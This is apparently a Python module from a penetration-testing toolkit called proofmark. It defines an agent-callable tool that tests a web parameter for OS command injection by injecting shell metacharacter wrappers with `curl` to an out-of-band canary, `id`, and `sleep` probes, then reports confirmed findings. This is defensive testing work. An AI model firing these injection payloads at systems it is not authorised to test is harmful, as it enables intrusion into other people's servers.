"""OS command-injection / RCE testing, with out-of-band proof.

RCE is the highest-impact finding and often blind. This tool proves it three
ways against one parameter: out-of-band (inject a `curl` to a canary and confirm
the callback), output-based (inject `id` and read the command output back), and
time-based (inject `sleep` and measure the delay). Any confirmation is a proven,
critical finding.
"""
from __future__ import annotations

import re
import time
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit

from proofmark.http_client import Request
from proofmark.tools.base import Tool, ToolResult

# Shell metacharacters that break out of the intended command, applied to the
# parameter's value as `<value><wrapper>`.
_WRAPPERS = ["; {c}", "| {c}", "|| {c}", "& {c}", "&& {c}", "$({c})", "`{c}`", "\n{c}"]

# `id` output — the classic proof the command ran.
_ID_SIG = re.compile(r"uid=\d+\([^)]*\)\s+gid=\d+|uid=\d+\s+gid=\d+")


class CommandInjectionTool(Tool):
    name = "command_injection_test"
    description = (
        "Test one parameter for OS command injection / RCE. Proves it out of band (inject a curl "
        "to a canary and confirm the callback — catches blind RCE), by output (inject `id` and "
        "read uid=… back), and by time (inject `sleep` and measure the delay). Give the full url "
        "and the parameter. Any confirmation is a critical finding."
    )
    parameters = {
        "type": "object",
        "properties": {
            "url": {"type": "string", "description": "Full target URL including the parameter's value."},
            "param": {"type": "string", "description": "Parameter to inject into."},
            "method": {"type": "string", "description": "HTTP method (default GET)."},
            "where": {"type": "string", "enum": ["query", "body"],
                      "description": "Where the parameter lives (default query)."},
            "body": {"type": "string", "description": "Form body, required when where=body."},
        },
        "required": ["url", "param"],
    }
    returns_untrusted_data = True

    def __init__(self, client, oob=None, delay_seconds: int = 5) -> None:
        self._client = client
        self._oob = oob
        self._delay = delay_seconds

    def _set(self, url, param, where, body, value):
        if where == "body":
            pairs = parse_qsl(body or "", keep_blank_values=True)
            if not any(k == param for k, _ in pairs):
                return None
            return url, urlencode([(k, value if k == param else v) for k, v in pairs])
        parts = urlsplit(url)
        pairs = parse_qsl(parts.query, keep_blank_values=True)
        if not any(k == param for k, _ in pairs):
            return None
        return urlunsplit(parts._replace(
            query=urlencode([(k, value if k == param else v) for k, v in pairs]))), body

    def _send(self, method, url, body):
        start = time.perf_counter()
        _ok, _text, ex = self._client.send(Request(method, url, {}, body))
        return (ex.status if ex else None), (ex.response_preview if ex else "") or "", \
            time.perf_counter() - start

    def _base_value(self, url, param, where, body):
        source = parse_qsl(body or "", keep_blank_values=True) if where == "body" \
            else parse_qsl(urlsplit(url).query, keep_blank_values=True)
        for k, v in source:
            if k == param:
                return v
        return None

    def run(self, url="", param="", method="GET", where="query", body=None, **_) -> ToolResult:
        method = (method or "GET").upper()
        where = "body" if where == "body" else "query"
        base = self._base_value(url, param, where, body)
        if base is None:
            return ToolResult(
                f"Parameter '{param}' was not found in the {where}. Check the name, or set "
                "where=body and pass the form body.", is_error=True)

        variant = self._set(url, param, where, body, base)
        _s, _b, base_time = self._send(method, *variant)
        findings: list[str] = []

        # 1) out-of-band (blind RCE)
        if self._oob is not None:
            token = self._oob.new_canary(f"cmdi {param}")
            cmd = f"curl {self._oob.http_url(token)}"
            for wrapper in _WRAPPERS[:6]:
                v = self._set(url, param, where, body, base + wrapper.format(c=cmd))
                self._send(method, *v)
            if self._oob.interactions(token):
                findings.append(
                    f"OUT-OF-BAND — an injected `{cmd}` reached the canary: "
                    f"{self._oob.interactions(token)[0].summary()}")

        # 2) output-based (`id`)
        if not any(f.startswith("OUT") for f in findings):
            for wrapper in _WRAPPERS:
                v = self._set(url, param, where, body, base + wrapper.format(c="id"))
                _s, rbody, _t = self._send(method, *v)
                m = _ID_SIG.search(rbody)
                if m:
                    findings.append(f"OUTPUT-BASED — injected `id` ran; response contained "
                                    f"{rbody[m.start():m.end()].strip()!r}.")
                    break

        # 3) time-based
        if not findings:
            for wrapper in _WRAPPERS[:5]:
                v = self._set(url, param, where, body, base + wrapper.format(c=f"sleep {self._delay}"))
                _s, _b, elapsed = self._send(method, *v)
                if elapsed - base_time >= self._delay * 0.6:
                    findings.append(f"TIME-BASED — injected `sleep {self._delay}` delayed the "
                                    f"response to {elapsed:.1f}s (baseline {base_time:.1f}s).")
                    break

        if not findings:
            return ToolResult(
                f"No command injection confirmed on '{param}'. Out-of-band, output, and time "
                "probes were all negative. Try other contexts (JSON body, headers) if suspicious.")
        lines = "\n".join(f"  • {f}" for f in findings)
        return ToolResult(
            f"COMMAND INJECTION CONFIRMED on '{param}' (critical).\n{lines}\n"
            "Record the finding citing the evidence; replay once to corroborate.")
